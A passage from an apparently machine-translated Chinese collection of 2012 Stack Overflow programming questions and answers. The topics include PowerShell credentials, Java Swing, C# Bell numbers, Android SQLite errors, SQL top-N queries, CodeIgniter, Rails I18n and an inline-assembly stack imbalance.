[System.Diagnostics.Process]::Start( "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe", "-command $script", $pp.UserName.Split('\')[1] , $pp.Password , $pp.UserName.Split('\')[0] )

$InScript 
```

带有启动命令的两行都有异常：

> 使用“5”参数调用“开始”的异常：“目录名称无效”

当我以管理员权限执行脚本时，它运行完美。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:03:08.373

您可以使用.net：

```
$pp= get-credential # as domain\username and password

[System.Diagnostics.Process]::Start( "powershell.exe", "-command $script", $pp.UserName.Split('\')[1] , $pp.Password , $pp.UserName.Split('\')[0] ) 
```

这是`::Start`方法的构造函数：

```
::Start(string fileName, string arguments, string userName, System.Security.SecureString password, string domain) 
```

编辑后评论：

尝试将完整路径放入exe：

```
[System.Diagnostics.Process]::Start( "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-command $script", $pp.UserName.Split('\')[1] , $pp.Password , $pp.UserName.Split('\')[0] ) 
```

或使用启动过程：

```
start-process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Credential $pp -ArgumentList $script 
```

# facebook - 将数据添加到配置文件 URL 应该指向什么？它将在哪里显示给用户？

> ID：10102649
> 
> 赞同：2
> 
> 时间：2012-04-11T08:44:17.770
> 
> 标签：facebook, facebook-opengraph, authentication

新的增强身份验证对话框中关于“将数据添加到配置文件 URL”配置选项的两个问题已经存在，但遗憾的是它们没有完整的答案。以下是供参考的问题：

[Open Graph Beta：将数据添加到配置文件 URL](http://facebook.stackoverflow.com/questions/7605474/open-graph-beta-add-data-to-profile-url)
[如何在身份验证对话框中配置“将数据添加到配置文件 URL”？](http://facebook.stackoverflow.com/questions/9597532/how-to-configure-add-data-to-profile-url-in-auth-dialog)

我有一个网站，允许用户使用 FB 凭据登录。我打算`publish_actions`对我网站上的一些用户操作使用开放图形功能。我正在配置新的增强身份验证对话框，但无法理解配置选项`Add Data to Profile URL`。

我的问题：

1.  这个 URL 应该指向什么？-- 它是我网站上的一个页面吗？它是 Facebook 提供的特殊应用页面吗？Facebook 会获取此页面并解析内容以显示在某处吗？这方面的文档非常含糊——它说“您的应用程序的新用户流 URL。此 URL 应指向加快参与和操作发布的 URL。请参阅下面的“将数据添加到配置文件”部分。”。我不明白这`new user flow URL`是什么..！`section below`也没有多说

2.  该 URL 将在哪里显示给用户 - 用户已经在使用我的应用程序和他们的朋友还没有使用我的应用程序？这会显示在 news_feed 故事或时间轴中吗？如果是这样`authenticated referrals`，当用户单击此链接时会启动吗？

3.  文档说，如果设置了这个配置选项，那么应用程序将在我的应用程序用户时间轴上显示的聚合中获得一个`Perforated Unit`和`Add to My Timeline Link`-- 这两个东西会出现在哪里？如果我将选项设置为任何值（例如我的网站主页），我会得到这些，还是应该指向具有特定`<og:xxx>`标签的页面？屏幕截图是孤立的，我不知道它们将出现在用户个人资料/时间线上的哪个位置。

我一直在反复阅读文档，但我不理解这个特定部分。任何帮助是极大的赞赏。

谢谢你。

# java - JFrame 设计面板看起来是空的

> ID：10102650
> 
> 赞同：0
> 
> 时间：2012-04-11T08:44:20.823
> 
> 标签：java, eclipse, jframe, windowbuilder

我使用 JFrame 中的设计面板创建了一个窗口，它没有任何问题。但是突然之间，当我尝试使用设计来编辑我的窗口时，什么都没有出现。我什至不能运行那个窗口，但是如果我从上一页开始运行它，它就会出现（我使用该`setVisible`方法来执行此操作）。你可以在下面看到我的代码：

```
import java.awt.EventQueue;

public class seat extends JFrame {

    private JPanel contentPane;

    public static void main(String[] args) {
        EventQueue.invokeLater(new Runnable() {
            public void run() {
                try {
                    seat frame = new seat();
                    frame.setVisible(true);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    public seat(String from, String to, String time, String date) {
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setBounds(380, 230, 50, 300);
        this.setTitle("Flight Reservation System");
        contentPane = new JPanel();
        contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
        setContentPane(contentPane);
        contentPane.setLayout(null);

        JLabel time1 = DefaultComponentFactory.getInstance().createTitle("- " + time);
        time1.setBackground(SystemColor.windowBorder);
        time1.setForeground(Color.BLACK);
        time1.setFont(new Font("Tahoma", Font.PLAIN, 11));
        time1.setBounds(338, 16, 55, 25);
        contentPane.add(time1);

        JLabel from1 = DefaultComponentFactory.getInstance().createTitle(from.substring(0, 3));
        from1.setFont(new Font("Tahoma", Font.PLAIN, 11));
        from1.setBounds(65, 16, 38, 25);
        contentPane.add(from1);

        JLabel to1 = DefaultComponentFactory.getInstance().createTitle("- " + to.substring(0, 3));
        to1.setFont(new Font("Tahoma", Font.PLAIN, 11));
        to1.setBounds(84, 16, 55, 25);
        contentPane.add(to1);

        date = date.replace(".", "/");
        JLabel date1 = DefaultComponentFactory.getInstance().createTitle(date.substring(0, 11));
        date1.setFont(new Font("Tahoma", Font.PLAIN, 11));
        date1.setBounds(277, 16, 67, 25);
        contentPane.add(date1);

        JLabel label_14 = new JLabel("");
        label_14.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\asdasd.png"));
        label_14.setBounds(60, 47, 19, 108);
        contentPane.add(label_14);

        JLabel a1 = new JLabel(" ");
        a1.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        a1.setBounds(71, 58, 39, 43);
        contentPane.add(a1);

        JLabel koltuk1 = new JLabel(" ");
        koltuk1.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        koltuk1.setBounds(109, 58, 38, 43);
        contentPane.add(koltuk1);

        JLabel koltuk2 = new JLabel(" ");
        koltuk2.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        koltuk2.setBounds(147, 58, 38, 43);
        contentPane.add(koltuk2);

        JLabel label_1 = new JLabel(" ");
        label_1.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        label_1.setBounds(185, 58, 38, 43);
        contentPane.add(label_1);

        JLabel label_2 = new JLabel(" ");
        label_2.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        label_2.setBounds(223, 58, 38, 43);
        contentPane.add(label_2);

        JLabel label_3 = new JLabel(" ");
        label_3.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        label_3.setBounds(261, 58, 38, 43);
        contentPane.add(label_3);

        JLabel label_4 = new JLabel(" ");
        label_4.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        label_4.setBounds(299, 58, 38, 43);
        contentPane.add(label_4);

        JLabel label_5 = new JLabel(" ");
        label_5.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        label_5.setBounds(337, 58, 38, 43);
        contentPane.add(label_5);

        JLabel lblNewLabel_2 = new JLabel(" ");
        lblNewLabel_2.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\cccccccccc.png"));
        lblNewLabel_2.setBounds(71, 97, 304, 20);
        contentPane.add(lblNewLabel_2);

        JLabel label_6 = new JLabel(" ");
        label_6.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        label_6.setBounds(71, 112, 38, 43);
        contentPane.add(label_6);

        JLabel label_7 = new JLabel(" ");
        label_7.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        label_7.setBounds(109, 112, 38, 43);
        contentPane.add(label_7);

        JLabel label_8 = new JLabel(" ");
        label_8.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        label_8.setBounds(147, 112, 38, 43);
        contentPane.add(label_8);

        JLabel label_9 = new JLabel(" ");
        label_9.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        label_9.setBounds(185, 112, 38, 43);
        contentPane.add(label_9);

        JLabel label_10 = new JLabel(" ");
        label_10.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        label_10.setBounds(223, 112, 38, 43);
        contentPane.add(label_10);

        JLabel label_11 = new JLabel(" ");
        label_11.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        label_11.setBounds(261, 112, 38, 43);
        contentPane.add(label_11);

        JLabel label_12 = new JLabel(" ");
        label_12.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        label_12.setBounds(299, 112, 38, 43);
        contentPane.add(label_12);

        JLabel label_13 = new JLabel(" ");
        label_13.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\Untitled.png"));
        label_13.setBounds(337, 112, 38, 43);
        contentPane.add(label_13);

        JLabel lblNewLabel_3 = new JLabel("");
        lblNewLabel_3.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\adsd.png"));
        lblNewLabel_3.setBounds(63, 40, 312, 26);
        contentPane.add(lblNewLabel_3);

        JLabel lblNewLabel_4 = new JLabel("");
        lblNewLabel_4.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\seats\\empty.png"));
        lblNewLabel_4.setBounds(81, 163, 46, 43);
        contentPane.add(lblNewLabel_4);

        JLabel label_15 = new JLabel("");
        label_15.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\seats\\selected.png"));
        label_15.setBounds(164, 166, 46, 43);
        contentPane.add(label_15);

        JLabel lblNewLabel_5 = new JLabel("");
        lblNewLabel_5.setIcon(new ImageIcon("C:\\Users\\Emre\\Desktop\\seats\\booked.png"));
        lblNewLabel_5.setBounds(254, 163, 46, 43);
        contentPane.add(lblNewLabel_5);

        JLabel lblSelected = new JLabel("Selected");
        lblSelected.setBounds(202, 176, 57, 14);
        contentPane.add(lblSelected);

        JLabel lblBooked = new JLabel("Booked");
        lblBooked.setBounds(292, 176, 46, 14);
        contentPane.add(lblBooked);

        JLabel lblEmpty = new JLabel("Empty");
        lblEmpty.setBounds(118, 176, 46, 14);
        contentPane.add(lblEmpty);

        JButton btnContinue = new JButton("Next");
        btnContinue.setBounds(359, 227, 62, 23);
        contentPane.add(btnContinue);

        btnContinue.addMouseListener(new MouseAdapter() {
            public void mouseClicked(MouseEvent arg0) {
                data page = new data();
                page.setVisible(true);
                setVisible(false);
            }
        });
    }

    public seat() {
        // TODO Auto-generated constructor stub
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:48:52.183

在 public static void main 中，仅调用空构造函数。您必须使用包含构建 GUI 的代码的参数调用构造函数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T08:54:53.933

而不是调用标准构造函数

```
seat frame = new seat(); 
```

你必须用

```
seat frame = new seat("from", "to", "time", "date"); 
```

# c# - 生成 Bells 数算法

> ID：10102653
> 
> 赞同：4
> 
> 时间：2012-04-11T08:44:45.870
> 
> 标签：c#, algorithm

我正在尝试为 500 到 1000 之间的大值生成第 n 个铃号。

铃数很大，我无法将其存储在 ulong 中。

（要知道铃铛号：[http](http://en.wikipedia.org/wiki/Bell_number) ://en.wikipedia.org/wiki/Bell_number ）

我尝试了三角法来计算数字。

任何一种方法都可以保存像 dat 这样的大量数字并执行操作。

这是我写的代码

* * *

```
using System;

class Program    
{        
    static void Main(string[] args)
    {
        int length;
        do
        {
            length =-1;                
            string numLength= Console.ReadLine();
            if (int.TryParse(numLength, out length))
            {   
                Console.WriteLine("Sequence length is : {0}",
                                           TriangularMethod(length));
            }
        }while(length>0);
    }

    static ulong TriangularMethod(int n)
    {
        Dictionary<long, List<ulong>> triangle = 
                                new Dictionary<long, List<ulong>>();
        triangle.Add(1, new List<ulong>(new ulong[] { 1 }));

        for (int i = 2; i <= n; i++)
        {
            triangle.Add(i, new List<ulong>());
            triangle[i].Add(triangle[i - 1].Last());
            ulong lastVal = 0;
            for (int k = 1; k < i; k++)
            {
                lastVal = triangle[i][k - 1] + triangle[i - 1][k - 1];
                triangle[i].Add(lastVal);                    
            }

            triangle.Remove(i - 2);
        }
        return triangle[n].Last();
    }        
} 
```

如果有更快的计算方法。请接受。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:58:24.120

在命名空间中使用`BigInteger Structure`可用`System.Numerics`

我认为这对你有用

[http://msdn.microsoft.com/en-us/library/system.numerics.biginteger.aspx](http://msdn.microsoft.com/en-us/library/system.numerics.biginteger.aspx)

[在 .NET 中处理令人难以置信的大量数字](https://stackoverflow.com/questions/279038/working-with-incredibly-large-numbers-in-net)

[http://www.codeproject.com/Articles/2728/C-BigInteger-Class](http://www.codeproject.com/Articles/2728/C-BigInteger-Class)

# android - android.database.sqlite.SQLiteDiskIOException：错误代码10：磁盘I/O错误

> ID：10102654
> 
> 赞同：2
> 
> 时间：2012-04-11T08:44:46.450
> 
> 标签：android, sqlite

当我使用 Sqlite 缓存我的数据时，我遇到了这个问题。我已经检查了其他类似的问题[，](https://stackoverflow.com/questions/8520441/sqlitediskioexception-error-code-10-disk-i-o-error-only-on-ics-on-samsung-ne)但我无法解决。

我的代码是

```
public int insertByTransaction(List<CacheContent> cacheContentList) {
    android.util.Log.v(com.usher.constants.Constants.TAG_CACHE, "Using transaction to insert records...");
    int count = 0;
    db = getWritableDatabase();
    if (db == null || db.isOpen() == false || cacheContentList == null) {
        return -1;
    }
    // begin transaction
    db.beginTransaction();
    try {
        long result = -1;
        for (CacheContent cacheContent : cacheContentList) {
            ContentValues values = new ContentValues();
            values.put(CacheContent.ID, cacheContent.getId());
            values.put(CacheContent.URL_HASH_CODE, cacheContent.getUrl_hash_code());
            values.put(CacheContent.SERVICE_CONTENT, cacheContent.getService_content());
            values.put(CacheContent.LAST_MODIFIED, cacheContent.getLast_modified());
            values.put(CacheContent.EVENT_BEGIN_TIME, cacheContent.getEvent_start_time());
            result = db.insert(TABLE_NAME, null, values);
            if (result != -1) {
                count++;
            }
        }
        // set Transaction Successful
        db.setTransactionSuccessful();
    } catch (Exception e) {
        e.printStackTrace();
    } finally {
        // end Transaction
        db.endTransaction();
    }
    return count;
} 
```

而logcat/error信息是

```
sqlite returned: error code = 1802, msg = statement aborts at 11: [INSERT INTO  .....] Error inserting  
android.database.sqlite.SQLiteDiskIOException: error code 10: disk I/O error
at android.database.sqlite.SQLiteStatement.native_executeInsert(Native Method)
at android.database.sqlite.SQLiteStatement.executeInsert(SQLiteStatement.java:112)
at android.database.sqlite.SQLiteDatabase.insertWithOnConflict(SQLiteDatabase.java:1737)
at android.database.sqlite.SQLiteDatabase.insert(SQLiteDatabase.java:1610)
at com.usher.services.DBHelper.insertByTransaction(DBHelper.java:118)
at com.usher.services.ServicesResultCache.addCacheOneByOne(ServicesResultCache.java:293)
at com.usher.services.EventService.doStartService(EventService.java:88)
at com.usher.services.DataServiceImpl$1.call(DataServiceImpl.java:187)
at com.usher.services.DataServiceImpl$1.call(DataServiceImpl.java:1)
at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:305)
at java.util.concurrent.FutureTask.run(FutureTask.java:137)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1081)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:574)
at java.lang.Thread.run(Thread.java:1020) 
```

# javascript - 有哪些资源可用于构建 2 人国际象棋游戏界面？

> ID：10102659
> 
> 赞同：3
> 
> 时间：2012-04-11T08:45:07.680
> 
> 标签：javascript, html, chess

我想创建一个 2 人国际象棋游戏。哪些 HTML 和 JS 资源可用于创建能够移动棋子的棋盘？（注意：我不想要国际象棋引擎）

另外，一旦我在浏览器中设置了棋盘，我应该如何使移动与在浏览器中打开相同网页的另一个人保持一致？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:53:58.950

您可以使用[jQuery AJAX 函数](http://api.jquery.com/category/ajax/)在玩家（和服务器）之间实时传达动作。

对于最终用户的交互性，[jQuery UI](http://jqueryui.com/)（jQuery 的官方扩展）。特别是[Droppable](http://jqueryui.com/demos/droppable/#revert)和/或[Sortable](http://jqueryui.com/demos/sortable/#display-grid)控件。

*（请参阅链接的演示）*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-21T03:21:45.367

你可以看看我正在开发的在线国际象棋应用程序，UI 是用`HTML`&编写`javascript (jQuery/knockout.js)`的，后端是用 Java 编写的，运行在 Jetty 8 服务器上。
我正在使用本机 websockets 进行通信。该应用程序托管在`http://www.chesshunt.com`

虽然国际象棋规则都是在服务器端编写的，但您仍然可以在`Javascript`.

# java-me - J2ME 应用程序中的嵌入式书签

> ID：10102664
> 
> 赞同：0
> 
> 时间：2012-04-11T08:45:35.210
> 
> 标签：java-me

有谁知道这在 J2ME 中是否可行？

我想要一个应用程序，它在打开时简单地启动浏览器并将浏览器定向到特定网页。

如果是这样，它是否得到广泛支持。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:41:55.140

您可以使用`javax.microedition.midlet.MIDlet.platformRequest()`它在几乎所有支持 JavaME 的手机上启动浏览器。本文详细[介绍](http://developers.sun.com/mobility/midp/ttips/platformRequest/)了调用浏览器等平台服务。

# sql - 什么是获得最佳 3 分的最佳和最简单的 SQL 查询及其相应的详细信息。

> ID：10102666
> 
> 赞同：1
> 
> 时间：2012-04-11T08:45:39.317
> 
> 标签：sql

我有一个存储分数的表“结果”。它按“测试”日期排序。现在我需要获取在测试中获得第 1、第 2 和第 3 名的用户的详细信息。

我想要获得第一分，我可以使用：

```
select *
from RESULTS
where SCORE=max(SCORE) 
```

但是第二和第三呢？也有可能在一个查询中将它们三个放在一起。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-11T08:47:30.190

你可以试试（MySql）

```
SELECT * FROM results
ORDER BY score DESC
LIMIT 3 
```

或 (MS-SQL)

```
SELECT TOP 3 * FROM results
ORDER BY score DESC 
```

或（甲骨文）

```
SELECT * FROM
    (SELECT * FROM results
     ORDER BY score DESC) t
WHERE ROWNUM < 4 
```

# php - 无法加载请求的类：codeigniter 中的消息

> ID：10102668
> 
> 赞同：0
> 
> 时间：2012-04-11T08:45:39.927
> 
> 标签：php, codeigniter

我正在使用 Codeigniter 消息库。

在我的控制器中，我有以下代码

```
public function __construct() {
    parent::__construct();
    $this->load->library('message');  
}

public function box($box_id=null, $language_name=null) {
   if($id_from_url[5]==null){
      $this->message->set('Please provide Box ID in URL.', 'error');
    }
} 
```

在我看来，我使用

```
 $this->message->display(); 
```

我已经将 Message.php 放在我的应用程序/库文件夹中，但出现以下错误

```
Message: Missing argument 1 for CI_Message::CI_Message(), called in W:\Zend\Apache2\htdocs\mediabox\system\core\Loader.php on line 1099 and defined 
```

关于这个错误的任何想法？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:09:20.020

您的标题与您在这里遇到的错误完全不同。它清楚地指出 Message 库需要传递给其构造的参数，但是您正在加载库而没有任何构造参数。

您需要在加载时使用第二个参数传递构造参数

```
$this->load->library('message',$config); 
```

如果您实际上在这里谈论这个消息库[http://codeigniter.com/wiki/Message](http://codeigniter.com/wiki/Message)那么我必须说，那里的文档不完整。

```
function CI_Message($config){    
    $this->CI =& get_instance();        
    $this->CI->load->library('session');

    if($this->CI->session->flashdata('_messages')) $this->messages = $this->CI->session->flashdata('_messages');
    if(isset($config['wrapper'])) $this->wrapper = $config['wrapper'];
} 
```

这里的构造需要`$config`传递给它的参数。

彻底检查文档。您需要在加载时传递它。

```
$config = array();
$config['wrapper'] = array('<div id="messages">', '</div>'); 
```

然后

```
$this->load->library('message',$config); 
```

# ruby-on-rails - 运行“bin/rake assets:precompile”时未设置 I18n 加载路径！

> ID：10102669
> 
> 赞同：8
> 
> 时间：2012-04-11T08:45:41.420
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, asset-pipeline, i18n-gem

我正在使用 I18n-js，我的客户端 I18n.t 调用在生产中运行时都返回翻译丢失消息。

在开发和测试中一切正常。

这个问题的根源似乎在于资产管道。

I18n.load_path 不包含我的任何翻译（运行 bin/rake assets:precompile 时）它只包含以下路径：

```
["/home/chris/.rvm/gems/ruby-1.9.3-p125@Project/gems/activesupport-3.2.3/lib/active_support/locale/en.yml",
"/home/chris/.rvm/gems/ruby-1.9.3-p125@Project/gems/activemodel-3.2.3/lib/active_model/locale/en.yml",
"/home/chris/.rvm/gems/ruby-1.9.3-p125@Project/gems/activerecord-3.2.3/lib/active_record/locale/en.yml",
"/home/chris/.rvm/gems/ruby-1.9.3-p125@Project/gems/actionpack-3.2.3/lib/action_view/locale/en.yml"] 
```

这些看起来像是来自 gems 的默认 activesupport、activemodel、activerecord 和 actionpack 翻译...

但是，在开发和生产中运行 bin/rails 控制台时，我的翻译路径确实按预期设置：

```
1.9.3p125 :002 > I18n.load_path
=> ["/home/chris/.rvm/gems/ruby-1.9.3-p125@Project/gems/activesupport-3.2.3/lib/active_support/locale/en.yml",
"/home/chris/.rvm/gems/ruby-1.9.3-p125@Project/gems/activemodel-3.2.3/lib/active_model/locale/en.yml",
"/home/chris/.rvm/gems/ruby-1.9.3-p125@Project/gems/activerecord-3.2.3/lib/active_record/locale/en.yml",
"/home/chris/.rvm/gems/ruby-1.9.3-p125@Project/gems/actionpack-3.2.3/lib/action_view/locale/en.yml",
"/home/chris/.rvm/gems/ruby-1.9.3-p125@Project/gems/carrierwave-0.6.1/lib/carrierwave/validations/../locale/en.yml",
"/home/chris/.rvm/gems/ruby-1.9.3-p125@Project/gems/devise-2.0.4/config/locales/en.yml",
"/media/sf_code/Project/config/locales/active_record.en.yml",
"/media/sf_code/Project/config/locales/project.en.yml"] 
```

事实上，I18n 文档指出：“默认语言环境是 :en，所有来自 config/locales/*.rb,yml 的翻译都是自动加载的。”

我也尝试在 application.rb 中指定

```
config.i18n.load_path += Dir[Rails.root.join('config', 'locales', '*.{rb,yml}').to_s] 
```

但仍然没有喜悦。

任何人都知道什么会导致仅在运行 assets:precompile 时才设置 I18n.load_path ？

感谢您的任何想法

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T23:24:37.257

这实际上是由于您可能在 config/application.rb 中设置了资产配置标志。

```
config.assets.initialize_on_precompile = false 
```

rake assets:precompile rake 任务检查此标志，如果发现为 false，则仅加载资产组，不完全初始化应用程序。反过来，应用程序区域设置不会添加到 I18n.load_path。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-03T14:15:49.167

这是因为`i18n.js`没有编译和处理`public/assets`，所以你必须添加以下行`config/environments/production.rb`

```
config.assets.precompile += %w( i18n.js en_locale.js fr_locale.js ) 
```

然后运行`rake assets:precompile`你会发现它`public/assets/i18n-MD5.js`现在已经存在并且可以被服务了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-10T15:06:54.820

您是否定义了默认语言环境？如果没有，您可以在 config/application.rb 中添加这一行

```
config.i18n.default_locale = :fr 
```

也许您也应该在您的 production.rb 中添加这一行，以便为 I18n 启用语言环境后备：

```
config.i18n.fallbacks = true 
```

然后，请注意您的语言环境文件中没有制表符缩进，而只有空格缩进。

语言环境不是资产，资产只有 js、css 和图像，因此资产编译和语言环境之间没有联系。

# c++ - 运行时检查失败 #0 - ESP 的值未在函数调用中正确保存

> ID：10102677
> 
> 赞同：2
> 
> 时间：2012-04-11T08:46:13.900
> 
> 标签：c++, assembly, runtime

```
#include<stdio.h>
int a[100];
int main(){
    char UserName[100];
    char *n=UserName;
    char *q=NULL;
    char Serial[200];
    q=Serial;
    scanf("%s",UserName);
//this is about 
    __asm{
        pushad
            mov eax,q
            push eax
            mov eax,n
            push eax
            mov EAX,EAX
            mov EAX,EAX
            CALL G1
            LEA EDX,DWORD PTR SS:[ESP+10H]
        jmp End
G1:
        SUB ESP,400H
            XOR ECX,ECX
            PUSH EBX
            PUSH EBP
            MOV EBP,DWORD PTR SS:[ESP+40CH]
        PUSH ESI
            PUSH EDI
            MOV DL,BYTE PTR SS:[EBP]
        TEST DL,DL
            JE L048
            LEA EDI,DWORD PTR SS:[ESP+10H]
        MOV AL,DL
            MOV ESI,EBP
            SUB EDI,EBP
L014:
        MOV BL,AL
            ADD BL,CL
            XOR BL,AL
            SHL AL,1
            OR BL,AL
            MOV AL,BYTE PTR DS:[ESI+1]
        MOV BYTE PTR DS:[EDI+ESI],BL
            INC ECX
            INC ESI
            TEST AL,AL
            JNZ L014
            TEST DL,DL
            JE L048
            MOV EDI,DWORD PTR SS:[ESP+418H]
        LEA EBX,DWORD PTR SS:[ESP+10H]
        MOV ESI,EBP
            SUB EBX,EBP
L031:
        MOV AL,BYTE PTR DS:[ESI+EBX]
        PUSH EDI
            PUSH EAX
            CALL G2
            MOV AL,BYTE PTR DS:[ESI+1]
        ADD ESP,8
            ADD EDI,2
            INC ESI
            TEST AL,AL
            JNZ L031
            MOV BYTE PTR DS:[EDI],0
            POP EDI
            POP ESI
            POP EBP
            POP EBX
            ADD ESP,400H
            RETN
L048:
        MOV ECX,DWORD PTR SS:[ESP+418H]
        POP EDI
            POP ESI
            POP EBP
            MOV BYTE PTR DS:[ECX],0
            POP EBX
            ADD ESP,400H
            RETN

G2:
        MOVSX ECX,BYTE PTR SS:[ESP+4]
        MOV EAX,ECX
            AND ECX,0FH
            SAR EAX,4
            AND EAX,0FH
            CMP EAX,0AH
            JGE L009
            ADD AL,30H
            JMP L010
L009:
        ADD AL,42H
L010:
        MOV EDX,DWORD PTR SS:[ESP+8]
        CMP ECX,0AH
            MOV BYTE PTR DS:[EDX],AL
            JGE L017
            ADD CL,61H
            MOV BYTE PTR DS:[EDX+1],CL
            RETN
L017:
        ADD CL,45H

            MOV BYTE PTR DS:[EDX+1],CL
            RETN

End:
        mov eax,eax
        popad
    }

    printf("%s\n",Serial);

    return 0;
} 
```

你能帮助我吗？关于Asm的这个问题，不知道为什么会导致这个结果。这个程序很简单，它是关于内部代码的程序。

运行时检查失败 #0 - ESP 的值未在函数调用中正确保存。这通常是调用使用一种调用约定声明的函数和使用另一种调用约定声明的函数指针的结果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:52:56.070

似乎在调用之前压入堆栈的两个参数`G1`永远不会从堆栈中弹出。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:01:41.723

可能发生这种情况是因为在函数的开头，在`G1`你`SUB ESP,400H`之后，在`L031`你`ADD ESP,8`结束时`ADD ESP,400H`。似乎通话`ESP`前比`G1`通话`8`后少。

**编辑：**关于汇编函数的编码风格，请看[这个](http://wiki.osdev.org/Stack)。这里简要描述了调用者的职责和被调用者的职责，这些职责是 ESP 所考虑的。

# html - html5画布时钟

> ID：10102684
> 
> 赞同：0
> 
> 时间：2012-04-11T08:46:58.680
> 
> 标签：html, canvas

我正在研究这个时钟。我对这个文件附带的js没有经验。

这是[演示](http://www.script-tutorials.com/demos/242/index.html)

这是所有[代码](http://css.dzone.com/articles/html5-canvas-clock-keeps)

如何编辑时钟的表面？

我正在看这个，我想更好地控制手的样子。有人能告诉我是什么让他们走到了一个点。我怎么能把它们变成一条粗线呢？

```
 // draw hour
ctx.save();
var theta = (hour - 3) * 2 * Math.PI / 12;
ctx.rotate(theta);
ctx.beginPath();
ctx.moveTo(-15, -5);
ctx.lineTo(-15, 5);
ctx.lineTo(clockRadius * 0.5, 1);
ctx.lineTo(clockRadius * 0.5, -1);
ctx.fill();
ctx.restore();

// draw minute
ctx.save();
var theta = (minute - 15) * 2 * Math.PI / 60;
ctx.rotate(theta);
ctx.beginPath();
ctx.moveTo(-15, -4);
ctx.lineTo(-15, 4);
ctx.lineTo(clockRadius * 0.8, 1);
ctx.lineTo(clockRadius * 0.8, -1);
ctx.fill();
ctx.restore();

// draw second
ctx.save();
var theta = (seconds - 15) * 2 * Math.PI / 60;
ctx.rotate(theta);
ctx.beginPath();
ctx.moveTo(-15, -3);
ctx.lineTo(-15, 3);
ctx.lineTo(clockRadius * 0.9, 1);
ctx.lineTo(clockRadius * 0.9, -1);
ctx.fillStyle = '#0f0';
ctx.fill();
ctx.restore();

ctx.restore();
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:57:02.807

看看每个跟注`ctx`做这手牌的方法：

```
ctx.rotate(theta);   // Rotates the canvas according to the hand position.
ctx.beginPath();     // Start drawing a path.
ctx.moveTo(-15, -4); // Set the "brush"/"pen" at center left corner.
ctx.lineTo(-15, 4);  // Draw a line to position center right corner.
ctx.lineTo(clockRadius * 0.8, 1);  // Draw a line to the edge, right corner.
ctx.lineTo(clockRadius * 0.8, -1); // Draw a line to the edge, left corner.
ctx.fill();          // Fill the polygon we just drew.
ctx.restore();       // Rotate the canvas back. 
```

因此，例如，将`1`and`-1`值更改为`4`and`-4`会生成一个厚矩形面。

可以在这里获得更多学习信息：http: [//www.html5canvastutorials.com/tutorials/html5-canvas-lines/](http://www.html5canvastutorials.com/tutorials/html5-canvas-lines/)

# objective-c - 将sql数据转换成csv文件

> ID：10102685
> 
> 赞同：0
> 
> 时间：2012-04-11T08:47:08.430
> 
> 标签：objective-c, sql, ios, cocoa-touch, csv

我有一个包含 5 列的 sql 文件，其中包含数据。如何将此 sql 文件数据转换为 csv 文件并将该 csv 文件存储在设备中。

# c++ - 文件合并 C++

> ID：10102686
> 
> 赞同：-1
> 
> 时间：2012-04-11T08:47:08.393
> 
> 标签：c++, file, binary

我正在开发一种用于文件拆分器和合并的算法，在那里我偶然发现了一个关于如何将文件（我拆分）与其原始扩展名（文件格式）合并的问题。我有一个想法，在拆分文件的第一个块的开头写入文件格式（即，如果我将文件拆分为三个文件，则将文件格式存储在 1.bij 文件中）。这个想法会奏效吗？你知道更好的主意吗，所以请与我分享。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:56:23.057

